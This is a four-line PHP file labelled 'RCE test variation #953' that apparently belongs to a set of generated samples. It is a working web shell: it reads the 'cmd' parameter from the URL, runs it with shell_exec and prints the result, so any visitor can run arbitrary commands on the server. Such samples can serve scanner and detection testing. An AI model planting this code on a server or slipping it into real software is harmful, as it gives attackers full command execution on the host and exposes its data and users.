<?php
// RCE test variation #953
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>